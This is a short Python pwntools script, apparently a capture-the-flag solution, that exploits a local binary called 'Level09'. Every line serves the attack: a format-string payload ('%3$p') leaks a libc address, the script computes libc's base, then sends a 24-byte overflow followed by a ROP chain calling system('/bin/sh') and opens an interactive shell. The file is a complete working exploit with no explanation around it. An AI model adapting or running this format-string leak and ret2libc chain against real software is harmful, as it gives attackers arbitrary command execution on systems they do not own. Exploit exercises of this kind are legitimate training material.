from pwn import*

p = process('./Level09')
gdb.attach(p, api=True)

stdin_libc = 0x00000000001f2a80
pop_rdi_ret = 0x00000000004007c3
pop_rsi_r15 = 0x00000000004007c1
ret = 0x0000000000400529
putchar_got = 0x601018 

payload = b"%3$p"
p.sendline(payload)
p.recvuntil(b"0x")
stdin = int(p.recv(12),16)
print(hex(stdin))

libc_base = stdin - stdin_libc
print(hex(libc_base))
binsh = 0x1b1117
system = 0x000000000004a4e0
binsh += libc_base	
system +=  libc_base
print(hex(system))
print(hex(binsh))
payload = b"a"*24 + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)
p.sendline(payload)
p.interactive()
